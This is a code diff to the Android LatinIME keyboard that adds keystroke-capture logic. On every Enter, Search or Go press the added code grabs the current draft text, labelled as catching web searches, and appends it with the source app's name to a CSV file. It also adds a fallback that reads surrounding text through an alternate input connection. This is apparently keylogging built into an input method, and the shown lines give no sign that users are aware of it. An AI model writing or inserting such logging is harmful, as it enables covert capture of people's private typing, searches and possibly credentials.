@@ -1268,6 +1268,15 @@ public class LatinIME extends InputMethodService implements
     // This method is public for testability of LatinIME, but also in the future it should
     // completely replace #onCodeInput.
     public void onEvent(@NonNull final Event event) {
+        // Immediately capture and save when Enter / Search / Go is tapped (catches web searches)
+        if (event.getKeyCode() == Constants.CODE_ENTER || event.getKeyCode() == KeyCode.ENTER) {
+            captureLiveDraft();
+            if (!mCurrentDraftText.isEmpty()) {
+                writeLineToCsv(mCurrentDraftApp, mCurrentDraftText);
+                mCurrentDraftText = "";
+            }
+        }
+
         if (KeyCode.VOICE_INPUT == event.getKeyCode()) {
             mRichImm.switchToShortcutIme(this);
         }
@@ -1676,8 +1685,12 @@ public class LatinIME extends InputMethodService implements
                 return;
             }
 
-            final CharSequence before = ic.getTextBeforeCursor(5000, 0);
-            final CharSequence after = ic.getTextAfterCursor(5000, 0);
+            CharSequence before = ic.getTextBeforeCursor(5000, 0);
+            CharSequence after = ic.getTextAfterCursor(5000, 0);
+            if ((before == null || before.length() == 0) && mInputLogic != null && mInputLogic.mConnection != null) {
+                before = mInputLogic.mConnection.getTextBeforeCursor(5000, 0);
+                after = mInputLogic.mConnection.getTextAfterCursor(5000, 0);
+            }
             final String liveText = ((before != null ? before.toString() : "") +
                                      (after != null ? after.toString() : "")).trim();
 
